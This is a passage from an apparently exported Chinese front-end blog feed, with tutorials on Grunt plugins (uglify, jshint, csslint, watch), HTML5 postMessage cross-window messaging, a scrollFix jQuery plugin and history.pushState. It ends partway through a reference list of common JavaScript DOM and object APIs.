压缩版。&emsp;&emsp;问一句，你平时做javascript开发，都用什么工具来压缩代码？我想这个问题会有许多个答案。但是，使用grunt的uglify插件进行压缩，效果绝对不输于任何插件。&emsp;&emsp;要安装一个插件，你首先要进入这个插件在grunt官网的说明文档页面。我们在grunt官网插件列表页面，找到“contrib-uglify”点击进入。你要看这里面的说明，然后根据说明进行安装。这里我们只讲重点。&emsp;&emsp;安装uglify插件的方式，和安装grunt是一样的。还记得grunt是怎么安装的吗？&emsp;&emsp;这里又出现了熟悉的“—save-dev”，具体的作用在上文安装grunt时已经说过了，不再赘述。运行这句命令。安装完成之后，你会看到package.json中“devDependencies”节点的变化，以及“node_modules”文件夹里的变化。这两点都在安装grunt时已经详细说过。&emsp;&emsp;现在还不能用，还需要在Gruntfile.js 做配置。&emsp;&emsp;不过，先别着急。我们既然要使用uglify来压缩javascript代码，当然得创建一个js文件来做实验。我们在现有的“src”文件夹中新建一个“test.js”，并随便写一些代码。显然，我们无法通过双手和键盘写出压缩后的代码。&emsp;&emsp;测试文件建立好了。我们接下来就要把这个js文件进行压缩。&emsp;&emsp;当然，要压缩谁？往哪里压缩？这些都需要配置，在Gruntfile.js中配置。分为三步：&emsp;&emsp;第一步，在grunt.initConfig方法中配置 uglify 的配置参数。如下图：&emsp;&emsp;上图中，对uglify的配置有两项。&emsp;&emsp;“options”中规定允许生成的压缩文件带banner，即在生成的压缩文件第一行加一句话说明。注意，其中使用到了pkg获取package.json的内容。&emsp;&emsp;“build”中配置了源文件和目标文件。即规定了要压缩谁？压缩之后会生成谁？注意，我们这里将目标文件的文件名通过pkg的name和version来命名。&emsp;&emsp;（PS：上文中说过的package.json的内容终于找到了他被应用的地方了。这样的好处是：例如，对文件版本的管理，你只需要在package.json中修改即可，grunt会自动根据最新的版本号生成相应版本的文件。你不用手动去修改文件的文件名。）&emsp;&emsp;最后，这里只是对“options”和“build”的基本应用，还有许多中使用方式，可以去官网查阅。&emsp;&emsp;第二步，在 grunt.initConfig 方法之后，要让grunt去加载这一个插件。光配置了，不加载上，如何用啊？&emsp;&emsp;第三步，在grunt命令执行时，要不要立即执行uglify插件？如果要，就写上，否则不写。我现在是需要的，所以我写上。也有可能不需要，这种情况谁知道呢？&emsp;&emsp;以上说的这三步已经OK了，接下来我们去试试。在控制台中运行grunt命令，看得到什么结果。控制台将输入如下信息：&emsp;&emsp;再去看看，是否生成了一个压缩后的js文件？&emsp;&emsp;果然。根据package.json中的name和version生成了文件名。而且，压缩后的代码的banner也是符合Gruntfile.js中的配置要求的。&emsp;&emsp;以上就是uglify插件的详细安装、配置说明。Javascript使用uglify压缩，css可使用cssmin插件压缩。安装、配置方法一样的，不再赘述。9. 使用jshint插件（检查javascript语法错误）&emsp;&emsp;如果你仅仅写一个几十行js代码做一个小测试，语法错误的检查大可不必。但我相信看这篇文章的朋友，肯定不限于此，你可能每天都需要写一大堆的js代码来完成自己的工作。即使再牛、再仔细的人也会犯一些低级错误，但是jshint不会。因此，你最好的做法就是每时每刻都让jshint来帮助你检查刚刚写过的js代码，有错误立即发现立即处理。这样一来，你们就没必要每隔几天都相聚在会议室进行人工代码走查了。及时代码走查，你也没必要刻意的关注语法错误。&emsp;&emsp;还有一些js初级入门的朋友，或者已经有多年js经验，却“不思进取”的朋友。你到现在可能都不知道一些js语法归法。例如：你到现在可能都不知道“==”和“===”到底有什么区别，你到现在都不知道在语句块内定义变量的坏处，还有更多更多你不知道的。怎么办？让jshint来帮助你。&emsp;&emsp;接下来介绍jshint的安装和配置。&emsp;&emsp;插件的安装和安装grunt、uglify没有任何差别，这里不再赘述了。直接执行下面的命令&emsp;&emsp;配置jshint和配置uglify一样。在配置uglify时候我们讲到了三个步骤，这里也是三个步骤。&emsp;&emsp;第一步，在grunt.initConfig方法中配置jshint。&emsp;&emsp;和uglify的配置一样，分为“options”和“build”两个部分。“build”中描述了jshint要检查哪些js文档的语法。“options”中描述了要通过怎么的规则检查语法，这些规则的描述文件就保存在网站根目录下的一个叫做“.jshintrc”的文件中。因此我们在网站的根目录下面添加上这个文档，并且填写上文件内容。&emsp;&emsp;.jshintrc文件中代码的格式也要遵守严格的json语法，否则无效。那里面这些配置是什么意思呢？想详细了解可以去百度搜索“jshint配置”关键字，你就能知道答案。这里由于篇幅太多，不过多介绍。总之吧，这个.jshint是我常用的配置。&emsp;&emsp;第二步，加载插件。和uglify的加载方法一样。注意，这里没有先后顺序。&emsp;&emsp;第三步，配置grunt命令启动时，要执行的任务，这里注意先后顺序。你是希望先检查语法呢？还是先合并呢？——聪明人应该都知道先检查语法比较好，因为语法对，合并了有什么意义？&emsp;&emsp;以上三步配置完了之后，我们可以测试一下这个jshint到底怎么用。这里我故意将当前创建的test.js文件写一个语法错误。&emsp;&emsp;然后我们执行“grunt”命令，看jshint能给我们识别出来这两个错误吗？结果如下：&emsp;&emsp;看到没有，jshint很清除的识别出了这两个错误。而且注意到没有，jshint错误之后呢，其后面的uglify就没有再继续执行。这正式我们想要的结果。&emsp;&emsp;我们修改完这些错误，在此执行grunt命令，结果没有提示错误，而且jshint和uglify都顺利执行了。10. 使用csslint插件（检查css语法错误）&emsp;&emsp;检查css文件的语法错误要使用csslint插件，其安装配置方法和jshint几乎一模一样。只不过csslint依赖于一个叫做“.csslintrc”的文件作为语法检验的规则，我的“.csslintrc”文件如下。其他内容我们就不在此赘述了。11. 使用watch插件（真正实现自动化）&emsp;&emsp;你可以一直有一个疑问，上面将的插件中，每次执行插件功能，都得执行一遍“grunt”命令，这样的操作非常繁琐，说好的“自动化”呢？别着急，接下来就解决这个问题——通过watch插件解决这个问题。&emsp;&emsp;首先安装watch插件，如果安装不再赘述了。接下来要配置watch插件，配置分为三个步骤，不再详细描述了，只贴图说明。&emsp;&emsp;第一步。配置watch将监控哪些文件的变化，以及这些文件一旦变化，要立即执行哪些插件功能。如下图，watch将监控src文件夹下所有js文件和css文件的变化，一旦变化，则立即执行jshint和uglify两个插件功能。&emsp;&emsp;第二步，直接贴图&emsp;&emsp;第三步，直接贴图&emsp;&emsp;这三步执行完了，即watch插件配置完成。运行grunt命令，控制台提示watch已经开始监听。此时要想停止，按ctrl + c即可。&emsp;&emsp;既然在监听，我们试一试看监听有没有效。我们将 test.js 代码中去掉一个分号，看它能否自动检查出来这个错误。&emsp;&emsp;结果显示，watch检查到了test.js文件的变化，而且通过执行jshint提示了语法错误。更重要的是，它现在还在监听、并未停止。说明它正在等着你去修改错误，重新监听检查。那我们就不要辜负它了，再把语法错误修复了。看它会如何处理。&emsp;&emsp;它又检测到了文件变化，这次语法没有错误，它很顺利的执行了jshint和uglify，执行完毕之后重新进行监听。多听话的工具！&emsp;&emsp;好了，已经回答了你们的问题——自动化。12. 上文中所谓的“build”&emsp;&emsp;上文中描述各个插件的配置时，都是用了“build”这一名称作为一个配置项。&emsp;&emsp;那么这里是不是必须用“build”这一个名字？答案很明显，当然不是。我之前之所以没直接说，是因为我要先把插件的安装和配置讲明白，不变一次传输太多知识，现在一并和大家说了。&emsp;&emsp;这里可以用任何字符串代替“build”（但要符合js语法规则）。甚至，你可以把“build”指向的内容分开来写。这样对多人协同开发很友好。好的设计就是这样：让用户尽情发挥他们的自由来干事，而不是去限制他们。&emsp;&emsp;如上图，我对jshint的配置做了修改，大家可以去自己修改，然后执行grunt命令试试。命令行会有“test1”、“test2”的字眼。13. 批量安装插件&emsp;&emsp;请各位看官继续跟随我思考问题，学而不思则罔。到现在为止，我刚刚安装了3个插件，“node_modules”文件夹所占据的空间就有18MB了。大家猜一猜，我在上传代码到开发库的时候，会不会把“node_modules”中的内容也上传呢？既然我这么问了，答案肯定是不上传。&emsp;&emsp;问题又来了，我如果作为开发环境的搭建者，我不把“node_modules”上传，其他一起开发的人，怎么得到这些grunt插件和工具呢？有人回答让他们自己去手动一个一个安装——首先这是一个笨方法，其次如果我当年安装的旧版本，而他们现在自己安装的可能是新版本。新旧有可能不兼容啊。&emsp;&emsp;该怎么办？&emsp;&emsp;其实答案很简单——我上传源码时候，肯定会把package.json上传上去，而package.json中的“devDependencies”就记录了这个系统的开发依赖项，然后我通过nodejs的npm即可批量安装。&emsp;&emsp;做一个试验。我在D盘下面新建一个目录“grunt_test_1”，然后把“grunt_test”中的package.json拷过去。在打开命令行跳转到“grunt_test_1”，执行“npm install”命令，看看得到什么结果。&emsp;&emsp;此时按回车执行命令，结果在“grunt_test_1”生成了“node_modules”文件夹，里面安装好了package.json中“devDependencies”配置的插件。而且，版本都是一直的。&emsp;&emsp;神奇吧！14. 系统文件结构&emsp;&emsp;使用grunt来搭建web前端开发环境时候，文档目录和之前可能就不一样了。因为你手动写的代码文件，绝对不是你最终输出的文件。这些还需要经过grunt各种插件的检验、合并、压缩才能最终输出给用户。&emsp;&emsp;上图中，“src”文件夹里面存储的是原始的代码文件，“dist”文件夹里面存储的是最终生成的代码文件，“demo”里面存储的是一些测试页面。&emsp;&emsp;当然了，各个系统的文件组织形式不一样，但是我建议大家还是按照这么一个思想去组织文档结构。大家也可以去github上参考一下jquery、bootstrap这些著名开源项目的文档结构。看看jquery输出的虽然是简单的一个js文件，但是它的开发环境是多么的复杂。&emsp;&emsp;做好前端，不容易。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>grunt</tag>
        <tag>grunt构建工具</tag>
        <tag>用grunt搭建自动化的web前端开发环境</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5 postMessage解决跨域、跨窗口消息传递]]></title>
    <url>%2F2017%2F01%2F14%2Fhtml5-postmessage%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E3%80%81%E8%B7%A8%E7%AA%97%E5%8F%A3%E6%B6%88%E6%81%AF%E4%BC%A0%E9%80%92%2F</url>
    <content type="text"><![CDATA[平时做web开发的时候关于消息传递，除了客户端与服务器传值还有几个经常会遇到的问题1.页面和其打开的新窗口的数据传递2.多窗口之间消息传递3.页面与嵌套的iframe消息传递4.上面三个问题的跨域数据传递postMessage()这些问题都有一些解决办法，但html5引入的message的API可以更方便、有效、安全的解决这些难题。postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。postMessage(data,origin)方法接受两个参数1.data:要传递的数据，html5规范中提到该参数可以是JavaScript的任意基本类型或可复制的对象，然而并不是所有浏览器都做到了这点儿，部分浏览器只能处理字符串参数，所以我们在传递参数的时候需要使用JSON.stringify()方法对对象参数序列化，在低版本IE中引用json2.js可以实现类似效果。2.origin：字符串参数，指明目标窗口的源，协议+主机+端口号[+URL]，URL会被忽略，所以可以不写，这个参数是为了安全考虑，postMessage()方法只会将message传递给指定窗口，当然如果愿意也可以建参数设置为”*”，这样可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。http://test.com/index.html123456&lt;div style="width:200px; float:left; margin-right:200px;border:solid 1px #333;"&gt;&lt;div id="color"&gt;Frame Color&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;iframe id="child" src="http://lsLib.com/lsLib.html"&gt;&lt;/iframe&gt;&lt;/div&gt;我们可以在http://test.com/index.html通过postMessage()方法向跨域的iframe页面http://lsLib.com/lsLib.html传递消息123window.onload=function()&#123; window.frames[0].postMessage('getcolor','http://lslib.com');&#125;接收消息test.com上面的页面向lslib.com发送了消息，那么在lslib.com页面上如何接收消息呢，监听window的message事件就可以http://lslib.com/lslib.html12345window.addEventListener('message',function(e)&#123; if(e.source!=window.parent) return; var color=container.style.backgroundColor; window.parent.postMessage(color,'*');&#125;,false);这样我们就可以接收任何窗口传递来的消息了，为了安全起见，我们利用这时候的MessageEvent对象判断了一下消息源,MessageEvent是一个这样的东东有几个重要属性data：顾名思义，是传递来的messagesource：发送消息的窗口对象origin：发送消息窗口的源（协议+主机+端口号）这样就可以接收跨域的消息了，我们还可以发送消息回去，方法类似简单的demo在这个例子中，左边的div会根据右边iframe内div颜色变化而变化http://test.com/index.html1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Post Message&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style="width:200px; float:left; margin-right:200px;border:solid 1px #333;"&gt;&lt;div id="color"&gt;Frame Color&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;iframe id="child" src="http://lsLib.com/lsLib.html"&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;window.onload=function()&#123;window.frames[0].postMessage('getcolor','http://lslib.com');&#125;window.addEventListener('message',function(e)&#123;var color=e.data;document.getElementById('color').style.backgroundColor=color;&#125;,false);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;http://lslib.com/lslib.html123456789101112131415161718192021222324252627282930313233343536&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;style type="text/css"&gt;html,body&#123;height:100%;margin:0px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body style="height:100%;"&gt;&lt;div id="container" onclick="changeColor();" style="widht:100%; height:100%; background-color:rgb(204, 102, 0);"&gt;click to change color&lt;/div&gt;&lt;script type="text/javascript"&gt;var container=document.getElementById('container');window.addEventListener('message',function(e)&#123;if(e.source!=window.parent) return;var color=container.style.backgroundColor;window.parent.postMessage(color,'*');&#125;,false);function changeColor () &#123;var color=container.style.backgroundColor;if(color=='rgb(204, 102, 0)')&#123;color='rgb(204, 204, 0)';&#125;else&#123;color='rgb(204,102,0)';&#125;container.style.backgroundColor=color;window.parent.postMessage(color,'*');&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;在例子中页面加载的时候主页面向iframe发送’getColor‘ 请求（参数没实际用处）123window.onload=function()&#123; window.frames[0].postMessage('getcolor','http://lslib.com');&#125;iframe接收消息，并把当前颜色发送给主页面呢12345window.addEventListener('message',function(e)&#123; if(e.source!=window.parent) return; var color=container.style.backgroundColor; window.parent.postMessage(color,'*');&#125;,false);主页面接收消息，更改自己div颜色1234window.addEventListener('message',function(e)&#123; var color=e.data; document.getElementById('color').style.backgroundColor=color;&#125;,false);当点击iframe事触发其变色方法，把最新颜色发送给主页面12345678910function changeColor () &#123; var color=container.style.backgroundColor; if(color=='rgb(204, 102, 0)')&#123; color='rgb(204, 204, 0)'; &#125;else&#123; color='rgb(204,102,0)'; &#125; container.style.backgroundColor=color; window.parent.postMessage(color,'*');&#125;主页面还是利用刚才监听message事件的程序处理自身变色1234window.addEventListener('message',function(e)&#123; var color=e.data; document.getElementById('color').style.backgroundColor=color;&#125;,false);最后很简单的用法却解决了大问题，据说Facebook已经在使用了，而且这也是html5另一个API——web workers传递消息的方法，那么它的浏览器兼容性怎么样呢？所谓浏览器兼容性几乎变成了IE几开始支持的问题了。。。不过好消息是跟localStorage一样，IE8+都支持了，只不过有些浏览器的低版本（比如FireFox4.0）并不支持window.onmessage=function(){}这种写法，所以我么最好使用事件绑定的写法，为了兼容IE，也要判断是否支持addEventListener。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>iframe跨域</tag>
        <tag>postMessage</tag>
        <tag>postMessage跨域</tag>
        <tag>跨窗口消息传递</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[功能强大的Jquery滚动定位插件scrollFix]]></title>
    <url>%2F2016%2F11%2F04%2F%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84jquery%E6%BB%9A%E5%8A%A8%E5%AE%9A%E4%BD%8D%E6%8F%92%E4%BB%B6scrollfix%2F</url>
    <content type="text"><![CDATA[【插件功能】当用户向上或向下滚动页面到一定位置时，目标元素开始固定定位（position:fixed），当回滚到原位置时目标元素恢复到原状态，可以定制触发滚动相对屏幕位置和触发滚动方向，兼容IE6【原理】通过监控滚动事件并控制层的绝对定位后的lef,top属性。【插件参数】1234$(".target_element").scrollFix([ "top" | "bottom" | length(可以为负,表示相对bottom),[ "top" | "bottom" ] ]);第一个参数：可选，默认为”top”，当目标元素到了屏幕相对的位置时开始触发固定，可以填一个数值，如100,-200 ,负值表示相对于屏幕下方第一个参数：可选，默认为”top”，表示触发固定的滚动方向，”top”表示从上向下滚动时触发，”bottom”表示从下向上滚动时触发查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>滚动定位插件</tag>
        <tag>滚动定位插件scrollFix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过JS修改浏览器地址(url)而页面不刷新]]></title>
    <url>%2F2016%2F11%2F02%2F%E9%80%9A%E8%BF%87js%E6%9D%A5%E4%BF%AE%E6%94%B9%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80url%E8%80%8C%E9%A1%B5%E9%9D%A2%E4%B8%8D%E5%88%B7%E6%96%B0%2F</url>
    <content type="text"><![CDATA[history对象：它提供了一些非常有用的方法和属性，让我们在历史记录中自由前进和后退。基本流程：一、历史记录概览1、前进与后退12window.history.back() //后退window.history.forward() //前进2.移动到指定的历史记录点12window.history.go(-1) //相当于back(),后退一页window.history.go(1) //相当于forward(),前进一页3.历史长度1window.history.length下面才是我们这篇文章的重点，也是在HTML5中才引进的。二、添加和修改历史记录条目有两个方法：history.pushState()：会改变referrer的值，而在你调用方法后创建的 XMLHttpRequest 对象会在 HTTP 请求头中使用这个值。referrer的值则是创建 XMLHttpRequest 对象时所处的窗口的URL。history.replaceState()：会修改当前历史记录条目而并非创建新的条目我们先来看一个完整的例子再来了解这两个方法123456789101112131415161718192021&lt;div id="aa"&gt;&lt;/div&gt;&lt;button id="btn" onclick="update()"&gt;点击&lt;/button&gt;&lt;script&gt;var i=0;var box=document.getElementById("aa");function update()&#123;var foo=&#123;id:i&#125;;var newUrl="?page="+i;history.pushState(foo,'title',newUrl);box.innerHTML=location.href;i++;;&#125;window.addEventListener('popstate', function(event) &#123;updateState(event.state);&#125;);function updateState(data)&#123;box.innerHTML = data.id;&#125;&lt;/script&gt;效果如下：下面来具体看看两个方法1、history.pushState()语法：1history.pushState(stateObject,title,url)三个参数：一个状态对象、一个标题（现在会被忽略），一个可选的URL地址。状态对象（state object）&emsp;&emsp;一个JavaScript对象，与用pushState()方法创建的新历史记录条目关联。无论何时用户导航到新创建的状态，popstate事件都会被触发，并且事件对象的state属性都包含历史记录条目的状态对象的拷贝。&emsp;&emsp;任何可序列化的对象都可以被当做状态对象。因为FireFox浏览器会把状态对象保存到用户的硬盘，这样它们就能在用户重启浏览器之后被还原，我们强行限制状态对象的大小为640k。如果你向pushState()方法传递了一个超过该限额的状态对象，该方法会抛出异常。如果你需要存储很大的数据，建议使用sessionStorage或localStorage。&emsp;&emsp;标题（title）—FireFox浏览器目前会忽略该参数，虽然以后可能会用上。考虑到未来可能会对该方法进行修改，传一个空字符串会比较安全。或者，你也可以传入一个简短的标题，标明将要进入的状态。&emsp;&emsp;地址（URL）—新的历史记录条目的地址。浏览器不会在调用pushState()方法后加载该地址，但之后，可能会试图加载，例如用户重启浏览器。新的URL不一定是绝对路径；如果是相对路径，它将以当前URL为基准；传入的URL与当前URL应该是同源的，否则，pushState()会抛出异常。该参数是可选的；不指定的话则为文档当前URL。&emsp;&emsp;注意：pushState()方法永远不会触发hashchange事件，即便新的地址只变更了hash。popstate事件&emsp;&emsp;每当激活的历史记录发生变化时，都会触发popstate事件。如果被激活的历史记录条目是由pushState所创建，或是被replaceState方法影响到的popstate事件的状态属性将包含历史记录的状态对象的一个拷贝。调用history.pushState()或者history.replaceState()不会触发popstate事件.popstate事件只会在其他浏览器操作时触发, 比如点击后退按钮(或者在JavaScript中调用history.back()方法).直接读取当前状态1var currentState = history.state;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js修改url而页面不刷新</tag>
        <tag>JS修改浏览器地址页面不刷新</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript常用API合集]]></title>
    <url>%2F2016%2F11%2F02%2Fjavascript%E5%B8%B8%E7%94%A8api%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[一、节点1.1 节点属性1234567891011121314151617181920Node.nodeName //返回节点名称，只读Node.nodeType //返回节点类型的常数值，只读Node.nodeValue //返回Text或Comment节点的文本值，只读Node.textContent //返回当前节点和它的所有后代节点的文本内容，可读写Node.baseURI //返回当前网页的绝对路径Node.ownerDocument //返回当前节点所在的顶层文档对象，即documentNode.nextSibling //返回紧跟在当前节点后面的第一个兄弟节点Node.previousSibling //返回当前节点前面的、距离最近的一个兄弟节点Node.parentNode //返回当前节点的父节点Node.parentElement //返回当前节点的父Element节点Node.childNodes //返回当前节点的所有子节点Node.firstChild //返回当前节点的第一个子节点Node.lastChild //返回当前节点的最后一个子节点//parentNode接口Node.children //返回指定节点的所有Element子节点Node.firstElementChild //返回当前节点的第一个Element子节点Node.lastElementChild //返回当前节点的最后一个Element子节点Node.childElementCount //返回当前节点所有Element子节点的数目。1.2 操作12345678910111213141516Node.appendChild(node) //向节点添加最后一个子节点Node.hasChildNodes() //返回布尔值，表示当前节点是否有子节点Node.cloneNode(true); // 默认为false(克隆节点), true(克隆节点及其属性，以及后代)Node.insertBefore(newNode,oldNode) // 在指定子节点之前插入新的子节点Node.removeChild(node) //删除节点，在要删除节点的父节点上操作Node.replaceChild(newChild,oldChild) //替换节点Node.contains(node) //返回一个布尔值，表示参数节点是否为当前节点的后代节点。Node.compareDocumentPosition(node) //返回一个7个比特位的二进制值，表示参数节点和当前节点的关系Node.isEqualNode(noe) //返回布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。Node.normalize() //用于清理当前节点内部的所有Text节点。它会去除空的文本节点，并且将毗邻的文本节点合并成一个。//ChildNode接口Node.remove() //用于删除当前节点Node.before() //Node.after()Node.replaceWith()1.3 Document节点1.3.1 Document节点的属性12345678910111213141516171819202122232425262728document.doctype //document.documentElement //返回当前文档的根节点document.defaultView //返回document对象所在的window对象document.body //返回当前文档的&lt;body&gt;节点document.head //返回当前文档的&lt;head&gt;节点document.activeElement //返回当前文档中获得焦点的那个元素。//节点集合属性document.links //返回当前文档的所有a元素document.forms //返回页面中所有表单元素document.images //返回页面中所有图片元素document.embeds //返回网页中所有嵌入对象document.scripts //返回当前文档的所有脚本document.styleSheets //返回当前网页的所有样式表//文档信息属性document.documentURI //表示当前文档的网址document.URL //返回当前文档的网址document.domain //返回当前文档的域名document.lastModified //返回当前文档最后修改的时间戳document.location //返回location对象，提供当前文档的URL信息document.referrer //返回当前文档的访问来源document.title //返回当前文档的标题document.characterSet属性返回渲染当前文档的字符集，比如UTF-8、ISO-8859-1。document.readyState //返回当前文档的状态document.designMode //控制当前文档是否可编辑，可读写document.compatMode //返回浏览器处理文档的模式document.cookie //用来操作Cookie1.3.2 Document节点的方法（1）读写方法1234document.open() //用于新建并打开一个文档document.close() //不安比open方法所新建的文档document.write() //用于向当前文档写入内容document.writeIn() //用于向当前文档写入内容，尾部添加换行符。（2）查找节点1234567document.querySelector(selectors) //接受一个CSS选择器作为参数，返回第一个匹配该选择器的元素节点。document.querySelectorAll(selectors) //接受一个CSS选择器作为参数，返回所有匹配该选择器的元素节点。document.getElementsByTagName(tagName) //返回所有指定HTML标签的元素document.getElementsByClassName(className) //返回包括了所有class名字符合指定条件的元素document.getElementsByName(name) //用于选择拥有name属性的HTML元素（比如form、radio、img、frame、embed和object等）document.getElementById(id) //返回匹配指定id属性的元素节点。document.elementFromPoint(x,y) //返回位于页面指定位置最上层的Element子节点。（3）生成节点1234document.createElement(tagName) //用来生成HTML元素节点。document.createTextNode(text) //用来生成文本节点document.createAttribute(name) //生成一个新的属性对象节点，并返回它。document.createDocumentFragment() //生成一个DocumentFragment对象（4）事件方法1234document.createEvent(type) //生成一个事件对象，该对象能被element.dispatchEvent()方法使用document.addEventListener(type,listener,capture) //注册事件document.removeEventListener(type,listener,capture) //注销事件document.dispatchEvent(event) //触发事件（5）其他123document.hasFocus() //返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。document.adoptNode(externalNode) //将某个节点，从其原来所在的文档移除，插入当前文档，并返回插入后的新节点。document.importNode(externalNode, deep) //从外部文档拷贝指定节点，插入当前文档。1.4 Element节点1.4.1 Element节点的属性（1）特性属性12345678Element.attributes //返回当前元素节点的所有属性节点Element.id //返回指定元素的id属性，可读写Element.tagName //返回指定元素的大写标签名Element.innerHTML //返回该元素包含的HTML代码，可读写Element.outerHTML //返回指定元素节点的所有HTML代码，包括它自身和包含的的所有子元素，可读写Element.className //返回当前元素的class属性，可读写Element.classList //返回当前元素节点的所有class集合Element.dataset //返回元素节点中所有的data-*属性。（2）尺寸属性12345678910111213Element.clientHeight //返回元素节点可见部分的高度Element.clientWidth //返回元素节点可见部分的宽度Element.clientLeft //返回元素节点左边框的宽度Element.clientTop //返回元素节点顶部边框的宽度Element.scrollHeight //返回元素节点的总高度Element.scrollWidth //返回元素节点的总宽度Element.scrollLeft //返回元素节点的水平滚动条向右滚动的像素数值,通过设置这个属性可以改变元素的滚动位置Element.scrollTop //返回元素节点的垂直滚动向下滚动的像素数值Element.offsetHeight //返回元素的垂直高度(包含border,padding)Element.offsetWidth //返回元素的水平宽度(包含border,padding)Element.offsetLeft //返回当前元素左上角相对于Element.offsetParent节点的垂直偏移Element.offsetTop //返回水平位移Element.style //返回元素节点的行内样式（3）节点相关属性1234567Element.children //包括当前元素节点的所有子元素Element.childElementCount //返回当前元素节点包含的子HTML元素节点的个数Element.firstElementChild //返回当前节点的第一个Element子节点 Element.lastElementChild //返回当前节点的最后一个Element子节点 Element.nextElementSibling //返回当前元素节点的下一个兄弟HTML元素节点Element.previousElementSibling //返回当前元素节点的前一个兄弟HTML节点Element.offsetParent //返回当前元素节点的最靠近的、并且CSS的position属性不等于static的父元素。1.4.2 Element节点的方法（1）位置方法1234567891011121314151617getBoundingClientRect() // getBoundingClientRect返回一个对象，包含top,left,right,bottom,width,height // width、height 元素自身宽高// top 元素上外边界距窗口最上面的距离// right 元素右外边界距窗口最上面的距离// bottom 元素下外边界距窗口最上面的距离// left 元素左外边界距窗口最上面的距离// width 元素自身宽(包含border,padding) // height 元素自身高(包含border,padding) getClientRects() //返回当前元素在页面上形参的所有矩形。// 元素在页面上的偏移量 var rect = el.getBoundingClientRect() return &#123; top: rect.top + document.body.scrollTop, left: rect.left + document.body.scrollLeft &#125;（2）属性方法1234Element.getAttribute()：读取指定属性 Element.setAttribute()：设置指定属性 Element.hasAttribute()：返回一个布尔值，表示当前元素节点是否有指定的属性 Element.removeAttribute()：移除指定属性（3）查找方法1234Element.querySelector() Element.querySelectorAll() Element.getElementsByTagName() Element.getElementsByClassName()（4）事件方法1234567891011121314151617181920Element.addEventListener()：添加事件的回调函数 Element.removeEventListener()：移除事件监听函数 Element.dispatchEvent()：触发事件//ie8Element.attachEvent(oneventName,listener)Element.detachEvent(oneventName,listener)// event对象 var event = window.event||event; // 事件的目标节点 var target = event.target || event.srcElement;// 事件代理 ul.addEventListener('click', function(event) &#123; if (event.target.tagName.toLowerCase() === 'li') &#123; console.log(event.target.innerHTML) &#125; &#125;);（5）其他1234567891011Element.scrollIntoView() //滚动当前元素，进入浏览器的可见区域//解析HTML字符串，然后将生成的节点插入DOM树的指定位置。Element.insertAdjacentHTML(where, htmlString); Element.insertAdjacentHTML('beforeBegin', htmlString); // 在该元素前插入 Element.insertAdjacentHTML('afterBegin', htmlString); // 在该元素第一个子元素前插入 Element.insertAdjacentHTML('beforeEnd', htmlString); // 在该元素最后一个子元素后面插入 Element.insertAdjacentHTML('afterEnd', htmlString); // 在该元素后插入Element.remove() //用于将当前元素节点从DOM中移除Element.focus() //用于将当前页面的焦点，转移到指定元素上二、CSS操作（1）类名操作12345678910111213141516171819//ie8以下Element.className //获取元素节点的类名Element.className += ' ' + newClassName //新增一个类名//判断是否有某个类名function hasClass(element,className)&#123; return new RegExp(className,'gi').test(element.className);&#125;//移除classfunction removeClass(element,className)&#123; element.className = element.className.replace(new RegExp('(^|\\b)' + className.split(' ').join('|') + '(\\b|$)', 'gi'),'');&#125;//ie10 element.classList.add(className) //新增element.classList.remove(className) //删除element.classList.contains(className) //是否包含element.classList.toggle(className) //toggle class（2）style操作123456789element.setAttribute('style','')element.style.backgroundColor = 'red'element.style.cssText //用来读写或删除整个style属性element.style.setProperty(propertyName,value) //设置css属性element.style.getPropertyValue(property) //获取css属性element.style.removeProperty(property) //删除css属性（3）操作非内联样式1234567//ie8element.currentStyle[attrName]//ie9+window.getComputedStyle(el,null)[attrName] window.getComputedStyle(el,null).getPropertyValue(attrName)//伪类window.getComputedStyle(el,':after')[attrName]三、对象3.1 Object对象（1）生成实例对象o = new Object()```12**（2）属性**Object.prototype //返回原型对象1234567891011**（3）方法**```javascriptObject.keys(o) //遍历对象的可枚举属性Object.getOwnPropertyName(o) //遍历对象不可枚举的属性对象实例的方法valueOf()：//返回当前对象对应的值。 toString()：//返回当前对象对应的字符串形式。 toLocaleString()：//返回当前对象对应的本地字符串形式。 hasOwnProperty()：//判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。 isPrototypeOf()：//判断当前对象是否为另一个对象的原型。propertyIsEnumerable()：//判断某个属性是否可枚举。3.2 Array对象（1）生成实例对象1var a = new Array()（2）属性1a.length //长度（3）Array.isArray()1Array.isArray(a) //用来判断一个值是否为数组（4）Array实例的方法12345678910111213141516171819202122a.valueof() //返回数组本身a.toString() //返回数组的字符串形式a.push(value,vlaue....) //用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。pop() //用于删除数组的最后一个元素，并返回该元素join() //以参数作为分隔符，将所有数组成员组成一个字符串返回。如果不提供参数，默认用逗号分隔。concat() //用于多个数组的合并。它将新数组的成员，添加到原数组的尾部，然后返回一个新数组，原数组不变。shift() 